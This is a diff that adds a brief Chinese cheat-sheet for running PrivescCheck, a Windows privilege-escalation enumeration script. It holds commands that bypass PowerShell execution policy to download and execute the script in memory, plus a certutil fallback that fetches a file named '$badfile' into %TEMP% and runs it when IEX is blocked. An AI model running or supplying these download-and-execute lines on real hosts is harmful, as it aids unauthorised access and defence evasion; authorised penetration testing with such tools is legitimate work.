@@ -1,0 +1,13 @@
+项目地址:https://github.com/itm4n/PrivescCheck/releases/tag/2026.03.28-1
+> 内存加载并执行默认检查（快速枚举）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Invoke-PrivescCheck"
+> 执行完整检查（包含更多细节，耗时更长）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Invoke-PrivescCheck -Extended"
+> 落地执行（IEX 被拦截时使用）
+cd %TEMP% && certutil -urlcache -split -f $downloadurl $badfile && powershell -exec bypass -File %TEMP%\$badfile
+
+###
+核心说明：
+PrivescCheck 是一个 Windows 本地提权检测脚本，
+类似 PowerUp，但输出更结构化、误报更少。
+###
